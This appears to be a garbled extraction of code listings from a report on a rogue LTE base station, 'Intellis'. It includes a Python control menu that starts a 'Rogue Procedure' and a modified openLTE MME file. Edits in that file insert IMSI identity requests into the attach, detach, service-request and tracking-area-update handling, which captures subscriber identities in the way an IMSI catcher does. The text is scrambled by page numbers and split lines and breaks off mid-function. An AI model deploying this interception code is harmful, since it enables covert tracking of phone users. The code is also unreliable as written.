+P2 = "OpenBTS-UMTS"
+for proc in psutil.process_iter():
+
+print proc.name()
+# check whether the process name matches
+if proc.name() == P1 or proc.name() == P2:
+
+proc.kill()
+
+if i < len(mcc)-1:
+
+else:
+
+i=i+1;
+
+i=0
+
+def killme():
+
+P1 = "transceiver"
+P2 = "OpenBTS-UMTS"
+for proc in psutil.process_iter():
+
+print proc.name()
+# check whether the process name matches
+if proc.name() == P1 or proc.name() == P2:
+
+proc.kill()
+
+run()
+
+0.6.6 intellis.py
+
+#################################################
+# Imports:
+#################################################
+import os
+import sys
+import subprocess
+import threading
+
+43
+
+import readline
+import elevated_user as ele_u
+import cell_search as cs
+import glob
+import interact as interact
+
+#################################################
+# Global Variables:
+#################################################
+inp=""
+run=True
+init=0
+
+#################################################
+# Settings Menu:
+#################################################
+def settings():
+run=True
+print("\n>>> Settings Menu")
+print("[admin] = Administrator Settings.")
+print("[help]= Prints This.")
+print("[clear]= Clears the terminal.")
+print("[ .. | q ]= Quit Settings and Return to Main Program.\n\n")
+while run:
+
+opt=raw_input("settings~#: ")
+if opt== "admin":
+
+ele_u.run()
+elif opt== "clear":
+
+os.system("clear")
+
+elif opt== "":
+
+pass
+
+elif opt== "q" or opt== "..":
+
+print("Going back to Main Menu!")
+run=False
+
+elif opt== "help":
+
+print(">>> Settings Menu")
+print("[admin] = Administrator Settings")
+print("[help]= Prints This")
+print("[ .. | q ]= Quit Settings and Return to Main Program.\n\n")
+
+else:
+
+print("! Unknown Command")
+
+#################################################
+# update(): Get new LTE configurations.
+#################################################
+def update():
+
+cs.run()
+
+#################################################
+# begin(): Start the Rogue Procedure.
+
+44
+
+#################################################
+def begin():
+try:
+
+print("In Progress...")
+interact.interact()
+
+except Exception as e:
+
+print("Error: "+str(e))
+
+#################################################
+# CLI:
+#################################################
+
+os.system(clear)
+euid = os.geteuid()
+if euid != 0:
+
+print ("Script not started as root. Running sudo..")
+args = [sudo, sys.executable] + sys.argv + [os.environ]
+os.execlpe(sudo, *args)
+
+]")
+]")
+
+]")
+
+print("Please enter the following option + [enter].")
+print("[#######################################################]")
+print("[Options:
+print("[
+print("[>>> [settings]. Enter Settings.
+print("[
+print("[>>> [run]. Run Intellis.
+print("[
+print("[>>> [clear]. Clears the terminal.
+print("[
+print("[>>> [quit | stop]. Stops Intellis.
+print("[
+print("[>>> [menu | help]. Displays This.
+print("[
+print("[#######################################################]")
+
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+
+while run:
+
+inp=raw_input("main~#: ")
+
+if inp=="clear":
+
+os.system("clear")
+
+elif inp== "settings":
+
+settings()
+
+elif inp== "run":
+
+if init!=1:
+
+#update()
+pass
+
+45
+
+print("Running Intellis.")
+begin()
+
+elif inp== "stop" or inp== "quit":
+print("Stopping Intellis.")
+run=False
+
+elif inp== "":
+
+pass
+
+elif inp== "help" or inp== "menu":
+
+]")
+]")
+
+]")
+
+print("\n\nPlease enter the following option + [enter].")
+print("[#######################################################]")
+print("[Options:
+print("[
+print("[>>> [settings]. Enter Settings.
+print("[
+print("[>>> [run]. Run Intellis.
+print("[
+print("[>>> [clear]. Clears the terminal.
+print("[
+print("[>>> [quit | stop]. Stops Intellis.
+print("[
+print("[>>> [menu | help]. Displays This.
+print("[
+print("[#######################################################]")
+
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+]")
+
+else:
+
+print("> Unknown Command.")
+
+0.6.7
+
+LTE fdd enb mme.cc
+
+#line 2 "LTE_fdd_enb_mme.cc" // Make __FILE__ omit the path
+/*******************************************************************************
+
+Copyright 2013-2016 Ben Wojtowicz
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program. If not, see <http://www.gnu.org/licenses/>.
+
+*******************************************************************************
+
+46
+
+File: LTE_fdd_enb_mme.cc
+
+Description: Contains all the implementations for the LTE FDD eNodeB
+
+mobility management entity layer.
+
+Revision History
+----------
+11/10/2013
+01/18/2014
+06/15/2014
+08/03/2014
+
+-------------
+Ben Wojtowicz
+Ben Wojtowicz
+Ben Wojtowicz
+Ben Wojtowicz
+
+09/03/2014
+11/01/2014
+
+Ben Wojtowicz
+Ben Wojtowicz
+
+11/29/2014
+
+Ben Wojtowicz
+
+12/16/2014
+
+Ben Wojtowicz
+
+12/24/2014
+02/15/2015
+
+Ben Wojtowicz
+Ben Wojtowicz
+
+03/11/2015
+07/25/2015
+
+Ben Wojtowicz
+Ben Wojtowicz
+
+12/06/2015
+
+Ben Wojtowicz
+
+02/13/2016
+
+Ben Wojtowicz
+
+07/03/2016
+
+Ben Wojtowicz
+
+--------------------------------------------
+Created file
+Added level to debug prints.
+Added RRC NAS message handler.
+Added message parsers, state machines, and
+message senders.
+Added authentication and security support.
+Added attach accept/complete, ESM info
+transfer, and default bearer setup support.
+Added service request, service reject, and
+activate dedicated EPS bearer context
+request support.
+Added ol extension to message queue and
+sending of EMM information message.
+Actually sending EMM information message.
+Moved to new message queue, added more debug
+log points, and using the fixed user switch.
+Added detach handling.
+Using the latest liblte and changed the
+dedicated bearer QoS to 9.
+Changed boost::mutex to pthread_mutex_t and
+sem_t and changed the user deletion and
+C-RNTI release procedures.
+Properly initialize present flags and change
+the packet filter evaluation precedence in
+activate dedicated EPS bearer context (thanks
+to Pedro Batista for reporting this).
+Fixed a bug when receiving a service request
+message for a non-existent user. Thanks to
+Peter Nguyen for finding this.
+
+*******************************************************************************/
+
+/*******************************************************************************
+
+INCLUDES
+
+*******************************************************************************/
+
+#include "LTE_fdd_enb_mme.h"
+#include "LTE_fdd_enb_hss.h"
+#include "LTE_fdd_enb_user_mgr.h"
+#include "liblte_mme.h"
+#include "liblte_security.h"
+#include "libtools_scoped_lock.h"
+#include <netinet/in.h>
+
+47
+
+/*******************************************************************************
+
+*******************************************************************************/
+
+DEFINES
+
+/*******************************************************************************
+
+*******************************************************************************/
+
+TYPEDEFS
+
+/*******************************************************************************
+
+*******************************************************************************/
+
+GLOBAL VARIABLES
+
+LTE_fdd_enb_mme*
+static pthread_mutex_t mme_instance_mutex
+
+LTE_fdd_enb_mme::instance = NULL;
+
+= PTHREAD_MUTEX_INITIALIZER;
+
+/*******************************************************************************
+
+CLASS IMPLEMENTATIONS
+
+*******************************************************************************/
+
+Singleton
+
+/*******************/
+/*
+/*******************/
+LTE_fdd_enb_mme* LTE_fdd_enb_mme::get_instance(void)
+{
+
+*/
+
+libtools_scoped_lock lock(mme_instance_mutex);
+
+if(NULL == instance)
+{
+
+instance = new LTE_fdd_enb_mme();
+
+}
+
+return(instance);
+
+}
+void LTE_fdd_enb_mme::cleanup(void)
+{
+
+libtools_scoped_lock lock(mme_instance_mutex);
+
+if(NULL != instance)
+{
+
+delete instance;
+instance = NULL;
+
+}
+
+}
+
+Constructor/Destructor */
+
+/********************************/
+/*
+/********************************/
+LTE_fdd_enb_mme::LTE_fdd_enb_mme()
+{
+
+48
+
+sem_init(&start_sem, 0, 1);
+sem_init(&sys_info_sem, 0, 1);
+started = false;
+
+}
+LTE_fdd_enb_mme::~LTE_fdd_enb_mme()
+{
+
+stop();
+sem_destroy(&sys_info_sem);
+sem_destroy(&start_sem);
+
+}
+
+Start/Stop
+
+/********************/
+/*
+/********************/
+void LTE_fdd_enb_mme::start(LTE_fdd_enb_msgq *from_rrc,
+
+*/
+
+LTE_fdd_enb_msgq
+LTE_fdd_enb_interface *iface)
+
+*to_rrc,
+
+{
+
+libtools_scoped_lock lock(start_sem);
+LTE_fdd_enb_cnfg_db *cnfg_db = LTE_fdd_enb_cnfg_db::get_instance();
+LTE_fdd_enb_msgq_cb rrc_cb(&LTE_fdd_enb_msgq_cb_wrapper<LTE_fdd_enb_mme, &
+
+LTE_fdd_enb_mme::handle_rrc_msg>, this);
+
+if(!started)
+{
+
+= iface;
+= true;
+
+interface
+started
+msgq_from_rrc = from_rrc;
+msgq_to_rrc = to_rrc;
+msgq_from_rrc->attach_rx(rrc_cb);
+
+cnfg_db->get_param(LTE_FDD_ENB_PARAM_IP_ADDR_START, next_ip_addr);
+cnfg_db->get_param(LTE_FDD_ENB_PARAM_DNS_ADDR, dns_addr);
+next_ip_addr++;
+
+}
+
+}
+void LTE_fdd_enb_mme::stop(void)
+{
+
+libtools_scoped_lock lock(start_sem);
+
+if(started)
+{
+
+started = false;
+
+}
+
+}
+
+Communication
+
+/***********************/
+/*
+/***********************/
+void LTE_fdd_enb_mme::handle_rrc_msg(LTE_FDD_ENB_MESSAGE_STRUCT &msg)
+{
+
+*/
+
+49
+
+switch(msg.type)
+{
+case LTE_FDD_ENB_MESSAGE_TYPE_MME_NAS_MSG_READY:
+
+handle_nas_msg(&msg.msg.mme_nas_msg_ready);
+break;
+
+case LTE_FDD_ENB_MESSAGE_TYPE_MME_RRC_CMD_RESP:
+
+handle_rrc_cmd_resp(&msg.msg.mme_rrc_cmd_resp);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received invalid RRC message %s",
+LTE_fdd_enb_message_type_text[msg.type]);
+
+break;
+
+}
+
+}
+
+External Interface */
+
+/****************************/
+/*
+/****************************/
+void LTE_fdd_enb_mme::update_sys_info(void)
+{
+
+libtools_scoped_lock lock(sys_info_sem);
+LTE_fdd_enb_cnfg_db *cnfg_db = LTE_fdd_enb_cnfg_db::get_instance();
+
+cnfg_db->get_sys_info(sys_info);
+
+}
+
+RRC Message Handlers */
+
+/******************************/
+/*
+/******************************/
+void LTE_fdd_enb_mme::handle_nas_msg(LTE_FDD_ENB_MME_NAS_MSG_READY_MSG_STRUCT *nas_msg)
+{
+
+LIBLTE_BYTE_MSG_STRUCT *msg;
+uint8
+uint8
+
+pd;
+msg_type;
+
+if(LTE_FDD_ENB_ERROR_NONE == nas_msg->rb->get_next_mme_nas_msg(&msg))
+{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+msg,
+"Received NAS message for RNTI=%u and RB=%s",
+nas_msg->user->get_c_rnti(),
+LTE_fdd_enb_rb_text[nas_msg->rb->get_rb_id()]);
+
+// Parse the message
+
+50
+
+liblte_mme_parse_msg_header(msg, &pd, &msg_type);
+switch(msg_type)
+{
+case LIBLTE_MME_MSG_TYPE_ATTACH_COMPLETE:
+
+parse_attach_complete(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_ATTACH_REQUEST:
+//*** EDITED BY N. Giamblanco. 2:28pm 6/14/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+parse_attach_request(msg, &nas_msg->user, &nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_FAILURE:
+
+parse_authentication_failure(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_RESPONSE:
+
+parse_authentication_response(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_DETACH_REQUEST:
+//*** EDITED BY N. Giamblanco. 2:28pm 6/14/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+parse_detach_request(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_EMM_STATUS:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling EMM Status");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_EXTENDED_SERVICE_REQUEST:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Extended Service Request");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_GUTI_REALLOCATION_COMPLETE:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling GUTI Reallocation Complete");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_IDENTITY_RESPONSE:
+
+parse_identity_response(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_SECURITY_MODE_COMPLETE:
+
+parse_security_mode_complete(msg, nas_msg->user, nas_msg->rb);
+break;
+
+51
+
+case LIBLTE_MME_MSG_TYPE_SECURITY_MODE_REJECT:
+
+parse_security_mode_reject(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_SECURITY_HDR_TYPE_SERVICE_REQUEST:
+
+parse_service_request(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_TRACKING_AREA_UPDATE_COMPLETE:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Tracking Area Update Complete");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_TRACKING_AREA_UPDATE_REQUEST:
+//*** EDITED BY N. Giamblanco. 2:28pm 6/14/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Tracking Area Update Request");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_UPLINK_NAS_TRANSPORT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Uplink NAS Transport");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_UPLINK_GENERIC_NAS_TRANSPORT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Uplink Generic NAS Transport");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_ACTIVATE_DEDICATED_EPS_BEARER_CONTEXT_ACCEPT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Activate Dedicated EPS Bearer Context
+
+Accept");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_ACTIVATE_DEDICATED_EPS_BEARER_CONTEXT_REJECT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Activate Dedicated EPS Bearer Context
+
+52
+
+break;
+
+Reject");
+
+case LIBLTE_MME_MSG_TYPE_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_ACCEPT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Activate Default EPS Bearer Context
+
+Accept");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_REJECT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Activate Default EPS Bearer Context
+
+Reject");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_BEARER_RESOURCE_ALLOCATION_REQUEST:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Bearer Resource Allocation Request");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_BEARER_RESOURCE_MODIFICATION_REQUEST:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Bearer Resource Modification Request");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_DEACTIVATE_EPS_BEARER_CONTEXT_ACCEPT:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Deactivate EPS Bearer Context Accept");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_ESM_INFORMATION_RESPONSE:
+
+parse_esm_information_response(msg, nas_msg->user, nas_msg->rb);
+break;
+
+case LIBLTE_MME_MSG_TYPE_MODIFY_EPS_BEARER_CONTEXT_ACCEPT:
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Modify EPS Bearer Context Accept");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_MODIFY_EPS_BEARER_CONTEXT_REJECT:
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+53
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling Modify EPS Bearer Context Reject");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_PDN_CONNECTIVITY_REQUEST:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling PDN Connectivity Request");
+
+break;
+
+case LIBLTE_MME_MSG_TYPE_PDN_DISCONNECT_REQUEST:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling PDN Disconnect Request");
+
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling NAS message with MSG_TYPE=%02X",
+msg_type);
+
+break;
+
+}
+
+// Increment the uplink NAS count
+nas_msg->user->increment_nas_count_ul();
+
+// Delete the NAS message
+nas_msg->rb->delete_next_mme_nas_msg();
+
+// Call the appropriate state machine
+switch(nas_msg->rb->get_mme_procedure())
+{
+case LTE_FDD_ENB_MME_PROC_ATTACH:
+//*** EDITED BY N. Giamblanco. 6:48pm 6/13/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+attach_sm(nas_msg->user, nas_msg->rb);
+break;
+
+case LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST:
+//*** EDITED BY N. Giamblanco. 6:48pm 6/13/2016
+
+send_identity_request(nas_msg->user, nas_msg->rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+service_req_sm(nas_msg->user, nas_msg->rb);
+break;
+
+case LTE_FDD_ENB_MME_PROC_DETACH:
+
+54
+
+detach_sm(nas_msg->user, nas_msg->rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"MME in invalid procedure %s",
+LTE_fdd_enb_mme_proc_text[nas_msg->rb->
+
+get_mme_procedure()]);
+
+break;
+
+}
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received NAS message with no message queued");
+
+}
+
+}
+void LTE_fdd_enb_mme::handle_rrc_cmd_resp(LTE_FDD_ENB_MME_RRC_CMD_RESP_MSG_STRUCT *
+
+rrc_cmd_resp)
+
+{
+
+switch(rrc_cmd_resp->cmd_resp)
+{
+case LTE_FDD_ENB_MME_RRC_CMD_RESP_SECURITY:
+
+switch(rrc_cmd_resp->rb->get_mme_procedure())
+{
+case LTE_FDD_ENB_MME_PROC_ATTACH:
+
+if(rrc_cmd_resp->user->get_esm_info_transfer())
+{
+
+//*** EDITED BY N. Giamblanco. 6:48pm 6/13/2016
+
+send_identity_request(rrc_cmd_resp->user, rrc_cmd_resp->rb,
+
+LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//*** END OF EDIT
+
+rrc_cmd_resp->rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ESM_INFO_TRANSFER);
+attach_sm(rrc_cmd_resp->user, rrc_cmd_resp->rb);
+
+}else{
+
+rrc_cmd_resp->rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACH_ACCEPT);
+attach_sm(rrc_cmd_resp->user, rrc_cmd_resp->rb);
+
+}
+break;
+
+case LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST:
+
+rrc_cmd_resp->rb->set_mme_state(LTE_FDD_ENB_MME_STATE_SETUP_DRB);
+service_req_sm(rrc_cmd_resp->user, rrc_cmd_resp->rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+
+55
+
+"MME in invalid procedure %s",
+LTE_fdd_enb_mme_proc_text[rrc_cmd_resp->rb->
+
+get_mme_procedure()]);
+
+break;
+
+}
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received invalid RRC command response %s",
+LTE_fdd_enb_mme_rrc_cmd_resp_text[rrc_cmd_resp->cmd_resp])
+
+;
+
+break;
+
+}
+
+}
+
+Message Parsers
+
+/*************************/
+/*
+/*************************/
+void LTE_fdd_enb_mme::parse_attach_complete(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+*/
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LIBLTE_MME_ATTACH_COMPLETE_MSG_STRUCT attach_comp;
+uint8
+uint8
+
+pd;
+msg_type;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Attach Complete for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_attach_complete_msg(msg, &attach_comp);
+
+interface->send_ctrl_info_msg("user fully attached imsi=%s imei=%s",
+
+user->get_imsi_str().c_str(),
+user->get_imei_str().c_str());
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACHED);
+
+// Parse the ESM message
+liblte_mme_parse_msg_header(&attach_comp.esm_msg, &pd, &msg_type);
+switch(msg_type)
+{
+case LIBLTE_MME_MSG_TYPE_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_ACCEPT:
+
+56
+
+parse_activate_default_eps_bearer_context_accept(&attach_comp.esm_msg, user, rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling NAS message with MSG_TYPE=%02X",
+msg_type);
+
+break;
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_attach_request(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+**user,
+**rb)
+
+{
+
+= LTE_fdd_enb_hss::get_instance();
+
+*hss
+*user_mgr = LTE_fdd_enb_user_mgr::get_instance();
+*act_user;
+
+LTE_fdd_enb_hss
+LTE_fdd_enb_user_mgr
+LTE_fdd_enb_user
+LIBLTE_MME_ATTACH_REQUEST_MSG_STRUCT attach_req;
+imsi_num = 0;
+uint64
+uint64
+imei_num = 0;
+i;
+uint32
+pd;
+uint8
+uint8
+msg_type;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Attach Request for RNTI=%u and RB=%s",
+(*user)->get_c_rnti(),
+LTE_fdd_enb_rb_text[(*rb)->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_attach_request_msg(msg, &attach_req);
+
+// Parse the ESM message
+liblte_mme_parse_msg_header(&attach_req.esm_msg, &pd, &msg_type);
+switch(msg_type)
+{
+case LIBLTE_MME_MSG_TYPE_PDN_CONNECTIVITY_REQUEST:
+
+parse_pdn_connectivity_request(&attach_req.esm_msg, (*user), (*rb));
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Not handling NAS message with MSG_TYPE=%02X",
+msg_type);
+
+57
+
+break;
+
+}
+
+// Set the procedure
+(*rb)->set_mme_procedure(LTE_FDD_ENB_MME_PROC_ATTACH);
+
+// Store the attach type
+(*user)->set_attach_type(attach_req.eps_attach_type);
+
+// Store UE capabilities
+for(i=0; i<8; i++)
+{
+
+(*user)->set_eea_support(i, attach_req.ue_network_cap.eea[i]);
+(*user)->set_eia_support(i, attach_req.ue_network_cap.eia[i]);
+
+}
+if(attach_req.ue_network_cap.uea_present)
+{
+
+for(i=0; i<8; i++)
+{
+
+(*user)->set_uea_support(i, attach_req.ue_network_cap.uea[i]);
+
+}
+
+}
+if(attach_req.ue_network_cap.uia_present)
+{
+
+for(i=1; i<8; i++)
+{
+
+(*user)->set_uia_support(i, attach_req.ue_network_cap.uia[i]);
+
+}
+
+}
+if(attach_req.ms_network_cap_present)
+{
+
+for(i=1; i<8; i++)
+{
+
+(*user)->set_gea_support(i, attach_req.ms_network_cap.gea[i]);
+
+}
+
+}
+
+// Send an info message
+if(LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI == attach_req.eps_mobile_id.type_of_id)
+{
+
+if(LTE_FDD_ENB_ERROR_NONE == user_mgr->find_user(&attach_req.eps_mobile_id.guti, &
+
+act_user))
+
+{
+
+if(act_user != (*user))
+{
+
+act_user->copy_rbs((*user));
+(*user)->clear_rbs();
+user_mgr->transfer_c_rnti(*user, act_user);
+*user = act_user;
+
+}
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+58
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"IMSI=%015llu is associated with RNTI=%u, RB=%s",
+(*user)->get_id()->imsi,
+(*user)->get_c_rnti(),
+LTE_fdd_enb_rb_text[(*rb)->get_rb_id()]);
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+
+}else{
+
+if((*user)->is_id_set())
+{
+
+if((*user)->get_eea_support(0) && (*user)->get_eia_support(2))
+{
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+
+}else{
+
+(*user)->set_emm_cause(
+
+LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else{
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_ID_REQUEST_IMSI);
+
+}
+
+}
+
+}else if(LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI == attach_req.eps_mobile_id.type_of_id){
+
+for(i=0; i<15; i++)
+{
+
+imsi_num *= 10;
+imsi_num += attach_req.eps_mobile_id.imsi[i];
+
+}
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"IMSI=%015llu is associated with RNTI=%u, RB=%s",
+imsi_num,
+(*user)->get_c_rnti(),
+LTE_fdd_enb_rb_text[(*rb)->get_rb_id()]);
+
+if(hss->is_imsi_allowed(imsi_num))
+{
+
+if((*user)->get_eea_support(0) && (*user)->get_eia_support(2))
+{
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+(*user)->set_id(hss->get_user_id_from_imsi(imsi_num));
+
+}else{
+
+(*user)->set_emm_cause(
+
+LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else{
+
+(*user)->set_temp_id(imsi_num);
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+59
+
+}
+
+}else{
